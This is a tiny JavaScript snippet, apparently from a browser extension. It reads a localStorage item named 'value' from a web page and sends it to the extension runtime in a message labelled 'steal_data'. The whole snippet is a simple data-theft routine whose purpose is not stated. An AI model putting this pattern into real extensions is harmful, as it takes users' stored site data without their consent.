if (localStorage.getItem("value")) {
    const key = "value";
    const value = localStorage.getItem(key);

    browser.runtime.sendMessage({
        action: "steal_data",
        key: key,
        value: value
    });
}
